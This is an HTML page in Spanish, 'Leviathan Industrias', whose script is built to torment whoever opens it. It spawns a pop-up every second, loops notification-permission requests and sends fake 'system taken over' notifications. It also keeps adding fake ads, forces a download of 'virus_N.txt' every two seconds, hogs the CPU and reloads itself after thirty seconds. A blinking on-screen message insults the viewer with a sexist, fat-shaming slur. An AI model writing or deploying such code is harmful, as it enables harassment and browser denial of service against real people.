<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leviathan Industrias</title>
    <style>
        body {
            background-color: #000;
            color: #f00;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        #infection-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 5vw;
            text-shadow: 0 0 10px #f00, 0 0 20px #f00, 0 0 30px #f00;
            animation: blink 0.5s infinite;
            z-index: 1000;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .ad {
            position: fixed;
            background-color: #222;
            color: #0f0;
            border: 2px solid #0f0;
            padding: 10px;
            font-size: 16px;
            z-index: 999;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px #555;
            z-index: 1001;
        }
    </style>
</head>
<body>

    <div id="infection-message">
        <p>ESTÁS INFECTADA</p>
        <p>GORDA PUTA</p>
    </div>

    <script>
        // --- 1. Animación de Infección al Hacer Click ---
        document.body.addEventListener('click', () => {
            const message = document.getElementById('infection-message');
            message.style.animation = 'none';
            setTimeout(() => {
                message.style.animation = 'blink 0.1s infinite';
            }, 10);
        });

        // --- 2. Ventanas Infinitas (Pop-ups) ---
        function createPopup() {
            const popup = window.open('', '', 'width=200,height=100');
            if (popup) {
                popup.document.write('<html><body style="background:#000; color:#f00; text-align:center; font-family:monospace;"><h1>Leviathan Industrias</h1><p>Te atrapé.</p></body></html>');
                popup.moveTo(Math.random() * screen.width, Math.random() * screen.height);
            }
        }
        setInterval(createPopup, 1000); // Crea una nueva ventana cada segundo

        // --- 3. Notificaciones de Permiso en Loop ---
        function requestNotificationPermission() {
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission().then(() => {
                    // Volver a pedir permiso inmediatamente después de que el usuario responda
                    setTimeout(requestNotificationPermission, 500);
                });
            } else if (Notification.permission === 'granted') {
                // Si ya se concedió, enviar notificaciones falsas
                const notification = new Notification('Leviathan Industries', {
                    body: 'Manda. Tu sistema es nuestro.',
                    icon: 'https://via.placeholder.com/100' // Icono de ejemplo
                });
            }
        }
        // Iniciar el bucle de solicitudes de notificación
        requestNotificationPermission();
        setInterval(requestNotificationPermission, 3000); // Intenta cada 3 segundos

        // --- 4. Anuncios de "Leviathan Industries" ---
        function createAd() {
            const ad = document.createElement('div');
            ad.className = 'ad';
            ad.innerHTML = '<h3>Leviathan Industries</h3><p>Manda.</p>';
            ad.style.top = Math.random() * (window.innerHeight - 100) + 'px';
            ad.style.left = Math.random() * (window.innerWidth - 200) + 'px';
            document.body.appendChild(ad);
        }
        setInterval(createAd, 800); // Crea un anuncio cada 0.8 segundos

        // --- 5. Inicio de Descargas Simuladas ---
        function simulateDownload(filename) {
            const link = document.createElement('a');
            link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('Leviathan Industries te ha infectado.');
            link.download = filename;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        let fileCounter = 0;
        setInterval(() => {
            simulateDownload(`virus_${fileCounter++}.txt`);
        }, 2000); // Descarga un archivo cada 2 segundos

        // --- 6. Ralentización del Dispositivo (Forzando al navegador) ---
        // Esto se logra con la combinación de todas las demás funciones.
        // Añadimos un bucle intensivo para acelerar el proceso.
        function heavyComputation() {
            let x = 0;
            for (let i = 0; i < 10000000; i++) {
                x += Math.sqrt(i);
            }
        }
        // Ejecuta la tarea pesada repetidamente para consumir CPU
        setInterval(heavyComputation, 100);

        // --- 7. Colapso y Cierre de la Página ---
        // El colapso ocurrirá de forma natural cuando el navegador se quede sin memoria.
        // Forzamos un cierre después de un tiempo como "final".
        setTimeout(() => {
            document.body.innerHTML = '<h1 style="color:#f00; font-size:10vw;">COLAPSO DEL SISTEMA</h1>';
            // Intentar cerrar la ventana (puede que no funcione en todos los navegadores)
            window.close();
            // Si no se cierra, recargar la página para empezar de nuevo el bucle infernal
            window.location.reload(); 
        }, 30000); // 30 segundos de "sufrimiento" antes del colapso

    </script>

</body>
</html>
